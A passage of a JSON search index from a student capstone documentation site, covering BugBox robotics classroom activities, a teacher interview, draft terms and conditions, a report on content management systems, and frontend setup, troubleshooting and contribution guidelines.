Species​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#activity-1-robotic-rangers-protecting-endangered-species","content":" ","version":"Next","tagName":"h2"},{"title":"Objective​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#objective","content":" Students will use BugBox robots to simulate monitoring and protecting endangered animals in their natural habitat by tracking environmental conditions and animal movements.  ","version":"Next","tagName":"h3"},{"title":"Grade Levels​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#grade-levels","content":" 8 to 12  ","version":"Next","tagName":"h3"},{"title":"Materials Needed​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#materials-needed","content":" BugBox robotsEnvironmental sensors (temperature, humidity, light)Animal tracking tags (RFID tags or color markers)Classroom map or model habitat (simulating terrains like forests, rivers, mountains)Computers or tablets with BugBox-compatible programming softwareData recording sheets  ","version":"Next","tagName":"h3"},{"title":"Preparation​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#preparation","content":" Set Up the Habitat: Create a model habitat in the classroom with different terrains, placing markers or tags that represent animals in various locations.Program the Robots: Ensure BugBox robots are equipped with environmental sensors and programmed to move through the habitat, detect tagged animals, and record environmental data.  ","version":"Next","tagName":"h3"},{"title":"Instructions​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#instructions","content":" Introduction (15 minutes)​  Discuss Endangered Species: Introduce the importance of protecting endangered species and how technology can help.Explain the Activity: Outline the task of using BugBox robots to simulate monitoring and protecting animals in a habitat.  Activity (60 minutes)​  Group Formation: Divide students into small groups of 3-4 students.Assign Roles: Programmer: Responsible for writing and adjusting the robot’s code.Navigator: Oversees the robot’s path and guides the team.Sample Collector: Responsible for ensuring the robot collects all necessary samples.Mission Control: Monitors data transmission and robot performance. Program the Robots: Students program the BugBox robots to navigate the habitat, detect animal tags, and record environmental conditions. The programming should include conditional statements for handling different terrains. Simulate Patrol: The robots patrol the habitat, collecting data on animal locations and environmental conditions. Students record this data. Data Collection and Analysis: Once the patrol is complete, groups analyze the data and discuss real-world implications.  Conclusion (15 minutes)​  Group Presentations: Each group presents their findings, highlighting significant data points and recommendations.Reflection: Discuss challenges faced during the activity and the real-world application of this technology in wildlife conservation.  ","version":"Next","tagName":"h3"},{"title":"Extensions​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#extensions","content":" Advanced Programming: Older students can add automated reporting features to their robots.Research Project: Students can research specific endangered species and propose robotics-based solutions for protecting them.  ","version":"Next","tagName":"h3"},{"title":"Assessment​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#assessment","content":" Participation and Collaboration: Evaluate group dynamics and teamwork. Programming Skills: Assess the quality and complexity of the robot programming.Data Analysis: Review the accuracy of data collection and analysis.Presentation: Evaluate the clarity and thoroughness of the final presentations.  ","version":"Next","tagName":"h3"},{"title":"Activity 2: Space Exploration and Rover Navigation​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#activity-2-space-exploration-and-rover-navigation","content":" ","version":"Next","tagName":"h2"},{"title":"Objective​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#objective-1","content":" Students will program BugBox robots to simulate a Mars rover navigating the Martian surface, learning basic programming concepts, problem-solving, and the importance of robotics in space exploration.  ","version":"Next","tagName":"h3"},{"title":"Grade Levels​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#grade-levels-1","content":" 8 to 14  ","version":"Next","tagName":"h3"},{"title":"Materials Needed​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#materials-needed-1","content":" BugBox robots (one per team)Computers with the BugBox programming environmentMars-themed obstacle course (can be created with classroom materials like cardboard, rocks, sand, etc.)&quot;Sample&quot; objects (e.g., small items like rocks or marbles)Data collection sheetsTimer  ","version":"Next","tagName":"h3"},{"title":"Preparation​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#preparation-1","content":" Set Up the Obstacle Course: Design a Mars-themed obstacle course in the classroom using simple materials like cardboard, rocks, and sand to mimic Martian terrain. Place &quot;sample&quot; objects at various points in the course to represent Mars rock samples.Program the Robots: Ensure the BugBox robots are ready for students to program, and the programming environment is accessible on each group's computer or tablet.  ","version":"Next","tagName":"h3"},{"title":"Instructions​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#instructions-1","content":" Introduction (10 minutes)​  Discuss Mars Rovers: Provide a brief overview of Mars exploration, focusing on robots like Curiosity and Perseverance. Highlight the tasks these rovers perform, such as navigating challenging terrain, collecting samples, and sending data back to Earth.Explain the Activity: Outline the objectives and tasks for the students. Explain that they will program their BugBox robots to simulate a Mars rover mission, navigating the Martian surface, collecting samples, and transmitting data.  Activity (60 minutes)​  Group Formation: Divide the students into small groups of 3-4.Assign Roles: Programmer: Responsible for writing and adjusting the robot’s code.Navigator: Oversees the robot’s path and guides the team.Sample Collector: Responsible for ensuring the robot collects all necessary samples.Mission Control: Monitors data transmission and robot performance. Programming the Robots: Each group will program their BugBox robot using block-based programming commands.The program should guide the robot through the Mars-themed obstacle course, allowing it to collect the sample objects and return to the starting point. Mars Rover Mission: Groups will take turns running their robots through the obstacle course.Teams will be timed, and points will be awarded based on successful navigation, collection of samples, and transmission of data. Data Collection and Analysis: During and after the mission, each group will document their robot’s performance, including how many samples were collected and how well the robot navigated the course.  Conclusion (15 minutes)​  Group Presentations: ach group presents their findings, discussing their programming strategy, any challenges they faced, and the results of their mission.Reflection: Engage the class in a discussion about the challenges Mars rovers face, comparing their experience to the real-world difficulties of space exploration. Reflect on how technology has enabled us to explore distant planets.  ","version":"Next","tagName":"h3"},{"title":"Extensions​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#extensions-1","content":" Advanced Programming: Introduce more advanced students to Python, allowing them to write more complex commands or implement additional features like autonomous obstacle detection.Research Project: Have students research actual Mars rovers and their missions, then present their findings to the class. They can also propose new rover tasks for future missions.Creative Challenges: Add new challenges to the obstacle course, such as having robots build structures, navigate more complex terrain, or solve puzzles along the way.  ","version":"Next","tagName":"h3"},{"title":"Assessment​","type":1,"pageTitle":"Classroom Activities","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/classroom-activities#assessment-1","content":" Participation and Collaboration: Evaluate how well students work in their groups, including communication and task delegation.Programming Skills: Assess the complexity and effectiveness of the students' programs, considering both the robot’s ability to navigate the course and its overall performance.Problem-Solving: Review how students responded to challenges they faced during the mission, including making adjustments to the robot’s programming. Presentation and Reflection: Evaluate the group presentations based on their analysis, creativity, and how well they reflected on their experience.  This activity combines learning about robotics and programming with space exploration, inspiring students to think critically and creatively about the possibilities of robotic technology in scientific discovery. ","version":"Next","tagName":"h3"},{"title":"Their Perspective","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/teacher-research","content":"","keywords":"","version":"Next"},{"title":"Research Overview​","type":1,"pageTitle":"Their Perspective","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/teacher-research#research-overview","content":" My research explored teachers’ interaction with BugBox, focusing on their views on incorporating robotics in classrooms. This research aimed to understand how BugBox can support teachers in enhancing the educational experience and fostering engagement among primary school students. I conducted interviews, distributed questionnaires, and evaluated teacher feedback to understand the integration challenges and benefits. Additionally, I explored their perspective on using robotics as part of a STEM curriculum.  ","version":"Next","tagName":"h2"},{"title":"Interview with a Teacher​","type":1,"pageTitle":"Their Perspective","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/teacher-research#interview-with-a-teacher","content":" I conducted a one-on-one interview with a teacher to gather more in-depth information. The interview touched on the teacher's perspective on using BugBox in a classroom environment and their thoughts on how robotics can impact learning. The teacher expressed positive views on robotics, particularly on how it can make subjects like STEM more engaging and accessible. However, they highlighted the need for better professional development and simple, easy-to-use interfaces to reduce the learning curve for both teachers and students. This aligns with my research conclusions on improving the BugBox platform. Here are the key questions and summarized responses:  ","version":"Next","tagName":"h2"},{"title":"General Perspective on Robotics in Education​","type":1,"pageTitle":"Their Perspective","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/teacher-research#general-perspective-on-robotics-in-education","content":" How do you feel about the integration of robotics in school curriculums? Great for extension studentsEngages students with hands-on manipulatives in learningEncourages and exposes students to STEM-based skills, problem-solving, creativity, and teamwork Do you think robotics can positively impact student learning and engagement? Why or why not? Yes, for the following reasons: Hands-on learning that caters to multiple learning stylesChallenges problem-solving skills, building resilienceEnhances engagement, motivation, and collective efficacy among peersSupports interdisciplinary learning by exposing students to STEM concepts How important do you believe it is for students to learn about robotics at an early age? Fairly beneficial for the following reasons:Develops problem-solving abilitiesProvides exposure to STEMEncourages creativityChallenges cognitive and fine motor skillsFosters teamwork and adaptation to technology  ","version":"Next","tagName":"h3"},{"title":"Practical Applications and Classroom Experience​","type":1,"pageTitle":"Their Perspective","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/teacher-research#practical-applications-and-classroom-experience","content":" Have you ever used robotics or technology-based learning tools in your classroom? If so, how did your students respond to them? Not much, but we use a coding program similar to Scratch for senior studentsMost students enjoy coding, but some become frustrated if they can't progress What challenges do you think teachers might face when implementing robotics in their lessons? Self-confidence in the product and contentTroubleshooting challenges faced by studentsVarying skill levels and emotional regulation among studentsExtra organization and preparation workTechnical issues, resource constraints, and classroom management In what ways do you think robotics could enhance or complement traditional teaching methods? Provides hands-on learning and interactive engagementConnects students to real-world careersPromotes problem-solving, critical thinking, and creativityEnables differentiated instruction for all learners  ","version":"Next","tagName":"h3"},{"title":"Curriculum and Student Development​","type":1,"pageTitle":"Their Perspective","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/teacher-research#curriculum-and-student-development","content":" How do you think learning robotics can contribute to students' overall development, including critical thinking, problem-solving, and creativity? Critical thinking is enhanced through solving problemsEarly exposure to obstacles strengthens problem-solving skillsStudents can design and modify robots, providing motivation and extension challenges for advanced learners Do you see robotics as a subject that should be mandatory, elective, or extracurricular in schools? Why? Not reallyDepends on the school's SES, demographic, and fundsPotentially more suited for senior cohorts than junior cohorts How do you think students of different age groups (e.g., primary vs. secondary) might benefit differently from learning robotics? Early exposure in primary school builds confidence for studying robotics in secondary schoolStudents can build a foundation in primary and exhibit mastery in secondary  ","version":"Next","tagName":"h3"},{"title":"Future of Robotics in Education​","type":1,"pageTitle":"Their Perspective","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/teacher-research#future-of-robotics-in-education","content":" What are your thoughts on the future of robotics in education? Do you think it will become a staple in all schools? Depends on the schoolsLikely more prominent in secondary schools than primary How can schools best support teachers in integrating robotics into their curriculum? Provide professional development and technical supportOffer access to resources, time for planning, and training students What do you think the role of parents should be in encouraging their children to learn about robotics? Show interest and curiosity toward technology and roboticsEncourage problem-solving to build resilienceGet involved in their children’s learning journey  ","version":"Next","tagName":"h3"},{"title":"Personal Insight​","type":1,"pageTitle":"Their Perspective","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/teacher-research#personal-insight","content":" If you had access to more resources, how would you like to incorporate robotics into your teaching? Establish STEM rooms/labsDevelop a dedicated robotics curriculumIntegrate robotics across disciplines, aligned with the Victorian - CurriculumOrganize lunchtime robotics clubs What advice would you give to other educators who are hesitant about introducing robotics into their classrooms? Be a role model and show curiosity toward robotics learningLearn together with the studentsSeek professional development and collaborate with colleaguesUse consistent terminology and integrate robotics into a P-6 curriculum scope Are there any specific skills or competencies that you think are essential for teachers to effectively teach robotics? Knowledge of curriculum integrationClassroom management and technological proficiencyStrong communication, collaboration, creative, and critical thinking skillsAbility to assess and evaluate learning outcomes  The feedback provided valuable insights into teachers' needs and concerns, such as the need for simple user interfaces, easy-to-follow lesson plans, and robust support systems to help them successfully integrate BugBox into their curriculum. These findings informed my recommendations on developing the teacher dashboard for BugBox, focusing on providing teachers with streamlined tools, detailed guides, and interactive content to enhance the robotics learning experience.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Their Perspective","url":"/redback-documentation/docs/project-5/Teacher-Reasearch/teacher-research#conclusion","content":" Overall, the research confirmed that teachers are open to adopting robotics in their teaching but require a supportive framework, including intuitive software and well-structured lesson plans. As a result, I am now focusing on optimizing the BugBox teacher dashboard to address these needs, which will enhance the usability of the platform, enabling teachers to confidently incorporate robotics into their classrooms. This user-centric approach will ensure that BugBox becomes a valuable tool in modern education, empowering teachers and students alike. ","version":"Next","tagName":"h2"},{"title":"Terms & Conditions","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/terms-conditions","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Terms & Conditions","url":"/redback-documentation/docs/project-5/terms-conditions#1-introduction","content":" Welcome to Bugbox! These Terms &amp; Conditions outline the rules and regulations for using the Bugbox educational platform, including our website and associated tools. By accessing and using Bugbox, you agree to comply with these terms. If you do not agree, please refrain from using the platform.  ","version":"Next","tagName":"h3"},{"title":"2. Eligibility​","type":1,"pageTitle":"Terms & Conditions","url":"/redback-documentation/docs/project-5/terms-conditions#2-eligibility","content":" Bugbox is intended for educational use by students, teachers, and schools. Users under the age of 13 must have parental or guardian consent to use the platform. Teachers are responsible for obtaining and managing necessary permissions for students using Bugbox.  ","version":"Next","tagName":"h3"},{"title":"3. User Responsibilities​","type":1,"pageTitle":"Terms & Conditions","url":"/redback-documentation/docs/project-5/terms-conditions#3-user-responsibilities","content":" Use Bugbox for educational purposes only.Do not share inappropriate or harmful content.Keep login credentials confidential and secure.Report any technical issues or breaches promptly to Bugbox support.  ","version":"Next","tagName":"h3"},{"title":"4. Account Information​","type":1,"pageTitle":"Terms & Conditions","url":"/redback-documentation/docs/project-5/terms-conditions#4-account-information","content":" Users are responsible for the accuracy of information provided during account registration. Bugbox reserves the right to suspend or terminate accounts that violate these terms or engage in unauthorized activities.  ","version":"Next","tagName":"h3"},{"title":"5. Platform Content​","type":1,"pageTitle":"Terms & Conditions","url":"/redback-documentation/docs/project-5/terms-conditions#5-platform-content","content":" All content, including but not limited to lessons, avatars, and designs, is the property of Bugbox. Redistribution or reproduction of this content without prior written consent is prohibited.  ","version":"Next","tagName":"h3"},{"title":"6. Liability and Disclaimers​","type":1,"pageTitle":"Terms & Conditions","url":"/redback-documentation/docs/project-5/terms-conditions#6-liability-and-disclaimers","content":" Bugbox strives to maintain a reliable and error-free platform but cannot guarantee uninterrupted access or complete accuracy. Users agree that Bugbox will not be held liable for any direct or indirect damages resulting from platform use.  ","version":"Next","tagName":"h3"},{"title":"7. Termination of Use​","type":1,"pageTitle":"Terms & Conditions","url":"/redback-documentation/docs/project-5/terms-conditions#7-termination-of-use","content":" Bugbox reserves the right to terminate user accounts for breaches of these terms, misuse of the platform, or any activity deemed harmful to the Bugbox community.  ","version":"Next","tagName":"h3"},{"title":"8. Governing Law​","type":1,"pageTitle":"Terms & Conditions","url":"/redback-documentation/docs/project-5/terms-conditions#8-governing-law","content":" These Terms &amp; Conditions are governed by the laws of ….  ","version":"Next","tagName":"h3"},{"title":"9. Contact Information​","type":1,"pageTitle":"Terms & Conditions","url":"/redback-documentation/docs/project-5/terms-conditions#9-contact-information","content":" For questions or concerns about these terms, please contact us at info@bugbox.com. ","version":"Next","tagName":"h3"},{"title":"Back-End Dev","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/backend","content":"","keywords":"","version":"Next"},{"title":"Project structure and repositories​","type":1,"pageTitle":"Back-End Dev","url":"/redback-documentation/docs/web-mobile-app-dev/backend#project-structure-and-repositories","content":" ","version":"Next","tagName":"h2"},{"title":"For all projects​","type":1,"pageTitle":"Back-End Dev","url":"/redback-documentation/docs/web-mobile-app-dev/backend#for-all-projects","content":"  ","version":"Next","tagName":"h3"},{"title":"Content Management System Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/CMS-report/cms_research","content":"","keywords":"","version":"Next"},{"title":"1. VR SunCycle Team​","type":1,"pageTitle":"Content Management System Report","url":"/redback-documentation/docs/web-mobile-app-dev/CMS-report/cms_research#1-vr-suncycle-team","content":" CMS in Use: No dedicated CMS reported.Content Types Stored: Game data (user progress, achievements, and customization settings).VR game environment assets (scenes, levels, and quests).Synchronization data between VR and mobile applications. Satisfaction: The team is content with their data storage and retrieval systems, which integrate well with their VR game and mobile application. Challenges: Lack of a unified CMS to handle content like static web pages, game updates, and user guides.Potential future requirements for a system that can manage both VR and non-VR content more efficiently.  ","version":"Next","tagName":"h2"},{"title":"2. Elderly Wearable Technology Team​","type":1,"pageTitle":"Content Management System Report","url":"/redback-documentation/docs/web-mobile-app-dev/CMS-report/cms_research#2-elderly-wearable-technology-team","content":" CMS in Use: Transition from ThingSpeak to Google Firebase.Content Types Stored: Health metrics (real-time monitoring data).Predictive model results (Alzheimer's, diabetes predictions).User interaction data with the website and mobile app. Satisfaction: Pleased with Firebase’s real-time data handling capabilities and integration with mobile and web applications. Challenges: Limited content management for non-data content like user guides, health tips, and educational materials.Need for a more robust CMS to handle expanding content as the product evolves.  ","version":"Next","tagName":"h2"},{"title":"3. Athlete Wearable Sensor Team​","type":1,"pageTitle":"Content Management System Report","url":"/redback-documentation/docs/web-mobile-app-dev/CMS-report/cms_research#3-athlete-wearable-sensor-team","content":" CMS in Use: No dedicated CMS reported.Content Types Stored: Athlete performance data.Predictive model outputs (VO2 max, FTP, race predictions).Training programs and customization data. Satisfaction: The team is satisfied with their current data analytics and integration with their website. Challenges: The absence of a dedicated CMS for static content like training guides, athlete tips, and blogs.Future scaling might require a CMS to better organize and present data-driven content and educational resources.  ","version":"Next","tagName":"h2"},{"title":"4. Crowd Monitoring and Player Tracking (Project Orion) Team​","type":1,"pageTitle":"Content Management System Report","url":"/redback-documentation/docs/web-mobile-app-dev/CMS-report/cms_research#4-crowd-monitoring-and-player-tracking-project-orion-team","content":" CMS in Use: MongoDB and Kafka for data logistics.Content Types Stored: Real-time video analysis and analytics data.AI-generated reports and dashboards.Metadata from face detection and pose estimation. Satisfaction: MongoDB and Kafka provide efficient data handling for real-time analysis. Challenges: Lack of a traditional CMS for storing static content like user manuals, system documentation, and educational content.Potential need for a CMS to handle non-analytical content as the project grows.  ","version":"Next","tagName":"h2"},{"title":"5. BugBox Team​","type":1,"pageTitle":"Content Management System Report","url":"/redback-documentation/docs/web-mobile-app-dev/CMS-report/cms_research#5-bugbox-team","content":" CMS in Use: None reported, collaborating with the Web Development team.Content Types Stored: User accounts (school, teacher, student).Classroom tasks and challenges.Playground environment and code snippets. Satisfaction: Currently satisfied with the web development tools in use, especially the Redback UI components. Challenges: The team might require a CMS to manage educational content, tasks, and coding challenges more efficiently as the platform expands.  ","version":"Next","tagName":"h2"},{"title":"6. Web Development Team​","type":1,"pageTitle":"Content Management System Report","url":"/redback-documentation/docs/web-mobile-app-dev/CMS-report/cms_research#6-web-development-team","content":" CMS in Use: Developing a content management system for static content.Content Types Stored: Company details, product information, user guides, and data explanations.Static content across various project web apps. Satisfaction: The team is content with the progress on the Redback UI library and the integration with project web apps. Challenges: The CMS is still under development, and there are ongoing efforts to integrate it fully with all project teams’ web apps.Needs to ensure the CMS meets the growing demands of handling static content across multiple projects.  ","version":"Next","tagName":"h2"},{"title":"7. Cybersecurity Team​","type":1,"pageTitle":"Content Management System Report","url":"/redback-documentation/docs/web-mobile-app-dev/CMS-report/cms_research#7-cybersecurity-team","content":" CMS in Use: No dedicated CMS reported.Content Types Stored: Security policies, training materials, and procedural documentation.Secure coding practices and guidelines. Satisfaction: The team is satisfied with their current document management practices. Challenges: Potential need for a CMS to manage extensive training materials and documentation more efficiently as the company’s security needs evolve.  ","version":"Next","tagName":"h2"},{"title":"8. Data Warehousing Team​","type":1,"pageTitle":"Content Management System Report","url":"/redback-documentation/docs/web-mobile-app-dev/CMS-report/cms_research#8-data-warehousing-team","content":" CMS in Use: No dedicated CMS, but collaborates with other teams on data storage and management.Content Types Stored: Data pipelines, predictive models, and data governance documents.Cross-project data storage and orchestration information. Satisfaction: The team is pleased with the current data warehouse solutions in place. Challenges: May require a CMS to manage data-related content, such as documentation, user guides, and data governance policies, as the data needs expand. ","version":"Next","tagName":"h2"},{"title":"Getting started with a project","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/getting-started","content":"","keywords":"","version":"Next"},{"title":"Prerequisites​","type":1,"pageTitle":"Getting started with a project","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/getting-started#prerequisites","content":" Git installedNode.js installedIDE or editor of choice (e.g., WebStorm, VS Code)Terminal of choice (e.g., Git Bash, Command Prompt, WSL, MacOS Terminal)Web browserGit credentials configured on your machine  ","version":"Next","tagName":"h2"},{"title":"Recommended​","type":1,"pageTitle":"Getting started with a project","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/getting-started#recommended","content":" React Dev Tools browser extension for Chrome, Firefox, or Edge  ","version":"Next","tagName":"h3"},{"title":"Optional​","type":1,"pageTitle":"Getting started with a project","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/getting-started#optional","content":" Git GUI such as GitKraken, SourceTree, GitHub Desktop (if you prefer this over working only with terminal commands)  ","version":"Next","tagName":"h3"},{"title":"Getting Started​","type":1,"pageTitle":"Getting started with a project","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/getting-started#getting-started","content":" Fork the repository you will be working on to your own account Clone the repository to your local machine git clone https://github.com/your-username/your-repo-name.git (or SSH if you have set up SSH access to your GitHub account) Select a task to work on from the Planner Board. If a suitable task does not exist for you but you have identified something that needs to be done, create a task for it and assign yourself. If it is a large feature, break it up into small, discrete tasks. Create a branch for your current work, following the Capstone Branching Guidelines git branch &lt;branch-name&gt; Check out your branch git checkout &lt;branch-name&gt; Open your terminal and navigate to the project directory cd path/to/your-repo-name Run npm install to install the project dependencies npm install Run npm run dev to start the development server npm run dev Open a web browser and navigate to http://localhost:5173 to view the application (or different port if specified in the terminal output). Make your changes. Commit your changes regularly and push your branch up to GitHub.  ","version":"Next","tagName":"h2"},{"title":"Useful links​","type":1,"pageTitle":"Getting started with a project","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/getting-started#useful-links","content":" Deakin Capstone Git contribution guideRedback-specific tutorialsReact docsTypeScript docsReact Router docsStyled Components docs ","version":"Next","tagName":"h2"},{"title":"Troubleshooting","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/help/troubleshooting","content":"","keywords":"","version":"Next"},{"title":"Can't push branch​","type":1,"pageTitle":"Troubleshooting","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/help/troubleshooting#cant-push-branch","content":" ","version":"Next","tagName":"h2"},{"title":"I get a \"fatal: empty ident name not allowed\" error in my terminal, or a 403 error in my GUI.​","type":1,"pageTitle":"Troubleshooting","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/help/troubleshooting#i-get-a-fatal-empty-ident-name-not-allowed-error-in-my-terminal-or-a-403-error-in-my-gui","content":" Please contact your project leader to ensure you have been added as a collaborator with write access to the repository. Alternatively, fork the repo and work on your fork instead.  ","version":"Next","tagName":"h3"},{"title":"I get the error remote: Support for password authentication was removed on August 13, 2021.​","type":1,"pageTitle":"Troubleshooting","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/help/troubleshooting#i-get-the-error-remote-support-for-password-authentication-was-removed-on-august-13-2021","content":" Cache your credentials using the instructions in this article: Caching your GitHub credentials in Git.  Tip: If you are using Linux or WSL, using the CLI is a super easy way to do this:  sudo apt install ghgh auth loginFollow the prompts to authenticate with your GitHub accountProfit.  ","version":"Next","tagName":"h3"},{"title":"Useful links​","type":1,"pageTitle":"Troubleshooting","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/help/troubleshooting#useful-links","content":" Vite docs ","version":"Next","tagName":"h2"},{"title":"Dos and don'ts","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/dos-donts","content":"","keywords":"","version":"Next"},{"title":"Summary of things to do​","type":1,"pageTitle":"Dos and don'ts","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/dos-donts#summary-of-things-to-do","content":"  Fork the existing repositories for the project(s) you need to work on to your own GitHub account, and do your work in that codebase. Create a branch in your fork for each piece of work. Use React for your front-end work, with the supporting tools and libraries described in this documentation such as TypeScript, Styled Components and React Router. Use the provided generator script to create new components. Use TypeScript with a type (or interface) in place of PropTypes. Use React function components in the first instance, or migrate if you have already developed a class component. Raise small pull requests, often. Keep pull requests limited to a single feature, change, or bugfix each.  ","version":"Next","tagName":"h2"},{"title":"Common mistakes and how to avoid them​","type":1,"pageTitle":"Dos and don'ts","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/dos-donts#common-mistakes-and-how-to-avoid-them","content":" ","version":"Next","tagName":"h2"},{"title":"Where to do your work​","type":1,"pageTitle":"Dos and don'ts","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/dos-donts#where-to-do-your-work","content":" Mistake Creating your own repository and start creating a website/app from scratch. Why it's a mistake These are team projects designed to be handed over and worked on by multiple capstone cohorts across trimesters. Multiple students creating new websites/apps from scratch means duplicated work, reduced collaboration, and inconsistency that negatively impacts our projects' longevity. What to do instead Fork the existing repositories for the project(s) you need to work on to your own GitHub account, and do your work in that codebase.    Mistake Assuming you cannot work on a company repo if you can't create a branch, so not doing any work or starting a new website/app from scratch. Why it's a mistake For ease of admin across trimesters, direct write access is limited to project leaders, mentors, and selected students who are experienced with Git and/or leading specific pieces of work. All students can fork the company repositories, so this is no barrier to beginning work. What to do instead Fork the repository and create a branch in your fork for each piece of work.    Mistake Adding a new folder with a separate React app to a repository. Why it's a mistake This is a team project. We are all working on the same app(s), and for separation of concerns and effective collaboration there must only be one app in each repository. What to do instead Follow the guides in this documentation website to set up and work on the app that has already been started.    ","version":"Next","tagName":"h3"},{"title":"Tech Stack​","type":1,"pageTitle":"Dos and don'ts","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/dos-donts#tech-stack","content":" Mistake Using PropTypes in React. Why it's a mistake PropTypes are deprecated and their use would block future upgrades. What to do instead Use TypeScript with a type (or interface) in place of PropTypes. The Redback UI repository has some examples you may find helpful, and using the generator for new components in Redback projects will set up the boilerplate for this for you.    Mistake Using class components in React. Why it's a mistake There may be some edge cases where class components are still appropriate and they are not officially deprecated, but they are considered to be a legacy API and are not recommended for new components. What to do instead Use function components in the first instance, or migrate if you have already developed a class component. For new components in a Redback project, using the generator script will set up the boilerplate for a function component for you.    Mistake Not using React, and writing your code in vanilla HTML/CSS/JS or using another framework/library. Why it's a mistake This is more of a recommendation of something to avoid than an outright error. Ultimately to be accepted into the projects, code needs to be compatible, so you're creating work for yourself if you build something that will need to be refactored later. If you are doing this because you don't know React, that's understandable and a valid choice so long as you understand that you will also need to make it work in React. Please also be aware that leaders and mentors may not have capacity to provide detailed feedback on code that is not PR-ready. What to do instead Consider this work a prototype - it can be shown in team meetings and used as a starting point or proof-of-concept (but do not raise pull requests with this code). Set aside some time to upskill/cross-skill in React and the other tools/libraries in our tech stack.    ","version":"Next","tagName":"h3"},{"title":"How to submit your work​","type":1,"pageTitle":"Dos and don'ts","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/dos-donts#how-to-submit-your-work","content":" Mistake Doing a lot of work over a long time in a single branch, then raising one huge pull request - often late in the trimester. Why it's a mistake The larger the PR, the more complex it is to review, meaning that: the review -&gt; feedback -&gt; changes -&gt; re-review loop takes longer, so the whole team and project(s) benefitting from your contribution is delayedmistakes and valuable technical feedback are more likely to be missed in reviewsit is harder to identify and fix merge conflicts, increasing the time you spend on tedious contributions may not be merged at all because time runs out. Many team members submitting large PRs late in the trimester exacerbates this due to the increased workload on leaders and mentors. What to do instead Raise small pull requests, often. For example, rather than waiting until you have completed a whole webpage, complete one component and submit a PR for that, then another for the next one, etc.    Mistake Sending code to project leaders or mentors directly. Why it's a mistake This is an impractical way to review code and provide feedback. Plus, all code submissions need to go through the pull request process regardless of any conversations that go on through other channels. What to do instead Raise a pull request to have your code reviewed. If it is a work-in progress you want feedback on, you can mark the PR as a draft and note in the title/description that it's a work-in-progress. Please see the Submitting Code page for more information.    Mistake Raising a pull request in the template repo, when it should be raised in a team project repo. Why it's a mistake Because the team project repositories are forked from the template, if you follow the link shown in your terminal after you push your commit to go to GitHub and raise a PR, it may have that as the target. What to do instead In that pull request creation screen, check the target and ensure your project repository is selected, not the template. ","version":"Next","tagName":"h3"},{"title":"Video Tutorials","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/help/tutorials","content":"","keywords":"","version":"Next"},{"title":"Contributing to Redback UI​","type":1,"pageTitle":"Video Tutorials","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/help/tutorials#contributing-to-redback-ui","content":" Short video tutorials covering the basics of setting up and contributing to Redback UI.  Local setup (5 minutes)Storybook 101 (9 minutes)Creating a new component + Styled Components 101 (15 minutes)Accessibility 101 + Styled Components 102 (coming soon) ","version":"Next","tagName":"h2"},{"title":"Useful External Links","type":0,"sectionRef":"#","url":"/redback-documentation/docs/web-mobile-app-dev/frontend/help/useful-links","content":"","keywords":"","version":"Next"},{"title":"Core stack documentation​","type":1,"pageTitle":"Useful External 